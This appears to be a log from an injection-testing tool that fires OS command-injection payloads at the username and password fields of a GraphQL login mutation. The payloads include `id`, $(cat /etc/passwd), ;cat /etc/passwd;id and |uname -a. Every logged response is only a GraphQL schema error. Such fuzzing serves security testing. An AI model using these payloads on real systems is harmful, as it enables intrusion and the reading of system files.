2026-02-02 23:16:07,213 | INFO    | InjectionTester      | backtick_id                    | login.password       | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 57}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,216 | INFO    | InjectionTester      | backtick_uname                 | login.password       | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 63}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,219 | INFO    | InjectionTester      | dollar_cat_passwd              | login.password       | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,222 | INFO    | InjectionTester      | dollar_id                      | login.password       | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 58}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,225 | INFO    | InjectionTester      | dollar_uname                   | login.password       | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,229 | INFO    | InjectionTester      | plain_uname                    | login.password       | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,232 | INFO    | InjectionTester      | chain_semicolon                | login.password       | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 72}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,236 | INFO    | InjectionTester      | chain_pipe                     | login.password       | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 72}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,239 | INFO    | InjectionTester      | chain_and                      | login.password       | POST | success  |  0.003s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,242 | INFO    | InjectionTester      | plain_cat_passwd               | login.password       | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,245 | INFO    | InjectionTester      | space_semicolon_cat            | login.password       | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,248 | INFO    | InjectionTester      | space_pipe_cat                 | login.password       | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,251 | INFO    | InjectionTester      | space_and_cat                  | login.password       | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,255 | INFO    | InjectionTester      | semicolon_id                   | login.username       | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 59}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,258 | INFO    | InjectionTester      | pipe_id                        | login.username       | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 59}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,261 | INFO    | InjectionTester      | double_pipe_id                 | login.username       | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,264 | INFO    | InjectionTester      | and_id                         | login.username       | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,268 | INFO    | InjectionTester      | semicolon_cat_passwd           | login.username       | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 72}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,271 | INFO    | InjectionTester      | pipe_cat_passwd                | login.username       | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 72}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,274 | INFO    | InjectionTester      | double_pipe_cat_passwd         | login.username       | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 73}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,277 | INFO    | InjectionTester      | and_cat_passwd                 | login.username       | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,280 | INFO    | InjectionTester      | semicolon_uname                | login.username       | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,284 | INFO    | InjectionTester      | pipe_uname                     | login.username       | POST | success  |  0.003s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,287 | INFO    | InjectionTester      | double_pipe_uname              | login.username       | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 66}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,290 | INFO    | InjectionTester      | and_uname                      | login.username       | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,293 | INFO    | InjectionTester      | backtick_cat_passwd            | login.username       | POST | success  |  0.003s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 73}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,297 | INFO    | InjectionTester      | backtick_id                    | login.username       | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,300 | INFO    | InjectionTester      | backtick_uname                 | login.username       | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 66}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,303 | INFO    | InjectionTester      | dollar_cat_passwd              | login.username       | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,307 | INFO    | InjectionTester      | dollar_id                      | login.username       | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,310 | INFO    | InjectionTester      | dollar_uname                   | login.username       | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,313 | INFO    | InjectionTester      | plain_uname                    | login.username       | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,317 | INFO    | InjectionTester      | chain_semicolon                | login.username       | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:07,320 | INFO    | InjectionTester      | chain_pipe                     | login.username       | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
